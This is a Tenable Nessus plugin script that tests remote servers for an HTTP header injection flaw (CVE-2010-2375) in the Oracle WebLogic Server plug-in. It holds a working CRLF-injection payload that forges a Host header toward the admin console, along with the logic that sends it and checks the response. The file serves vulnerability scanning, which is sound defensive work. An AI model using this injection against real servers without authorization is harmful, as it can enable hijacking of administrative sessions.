#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(47898);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2015/09/24 23:21:22 $");

  script_cve_id("CVE-2010-2375");
  script_bugtraq_id(41620);
  script_osvdb_id(66359);

  script_name(english:"Oracle WebLogic Server Plug-in HTTP Injection");
  script_summary(english:"Tries to exploit the issue");

  script_set_attribute(attribute:"synopsis", value:
"The remote web server uses a module that is affected by an HTTP
injection vulnerability." );
  script_set_attribute(attribute:"description", value:
"The remote web server is using the WebLogic plug-in for Apache, IIS,
or Sun web servers, a module included with Oracle (formerly BEA)
WebLogic Server and used to proxy requests from an HTTP server to
WebLogic. 

The version of this plug-in on the remote host is affected by an HTTP
injection vulnerability because it fails to sanitize request headers
of special characters, such as new lines, before passing them to
WebLogic application servers. 

An unauthenticated, remote attacker may be able to exploit this issue
to conduct a variety of attacks, such as trusted header injection and
HTTP request smuggling." );
  script_set_attribute(attribute:"see_also",value:
"http://www.vsecurity.com/resources/advisory/20100713-1/");
  script_set_attribute(attribute:"see_also",value:
"http://www.oracle.com/technetwork/topics/security/cpujul2010-155308.html");
  script_set_attribute(attribute:"solution",value:
"Apply the Oracle July 2010 Critical Patch Update (CPU).");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

  script_set_attribute(attribute:"vuln_publication_date",value:"2010/07/13");
  script_set_attribute(attribute:"patch_publication_date",value:"2010/07/13");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/07/29");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe",value:"cpe:/a:oracle:weblogic_server");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Web Servers");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80);


# We need a known JSP file for this.
files = get_kb_list("www/"+port+"/content/extensions/jsp");
if (isnull(files)) file = "/index.jsp";
else
{
  files = make_list(files);
  file = files[0];
}


# Try to exploit it.
protected_dir = '/console/';
exploit = protected_dir + ' HTTP/1.1\r\nHost: ' + SCRIPT_NAME + '\r\nX-Nessus: ';

exploit = urlencode(
  str        : exploit,
  unreserved : "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.!~*'()-]/:"
);
url = exploit + file;

# nb: if WebLogic has just been started, the console will need to be deployed 
#     so we may need to try the attack twice.
for (i=0; i<2; i++)
{
  res = http_send_recv3(method:"GET", item:url, version:10, port:port, exit_on_fail:TRUE);
  if (!res[1] || "X-Powered-By: Servlet" >!< res[1]) 
    exit(0, "The web server listening on port "+port+" does not appear to use a WebLogic Server Plug-in.");

  if (i == 0 && "deployed on the first access" >< res[2])
  {
    res = http_send_recv3(method:"GET", item:"/console/", port:port, exit_on_fail:TRUE);
    sleep(5);
    continue;
  }

  hdrs = parse_http_headers(status_line:res[0], headers:res[1]);
  if (isnull(hdrs['$code'])) code = 0;
  else code = hdrs['$code'];

  if (isnull(hdrs['set-cookie'])) cookies = "";
  else cookies = hdrs['set-cookie'];

  if (isnull(hdrs['location'])) location = "";
  else location = hdrs['location'];

  # If ...
  if (
    # we're redirected and ...
    code == 302 &&
    # an admin cookie was set.
    "ADMINCONSOLESESSION=" >< cookies
  )
  {
    # There's a problem if we're redirected to our "host".
    if ('://'+SCRIPT_NAME >< location)
    {
      set_kb_item(name:'www/'+port+'/XSS', value:TRUE);

      if (report_verbosity > 0)
      {
        report =  
          '\nUsing the following request, Nessus was able to exploit the' +
          '\nvulnerability to inject a Host request header with the name of the' +
          '\nplugin itself and have that be used by WebLogic in the response :' +
          '\n' +
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
          http_last_sent_request() + 
          crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
    # a patched version just ignores our Host header in the redirect.
    else break;
  }
  # unexpected output -- just bail.
  else break;
}
exit(0, "The web server listening on port "+port+" does not use a vulnerable version of WebLogic Server Plug-in.");
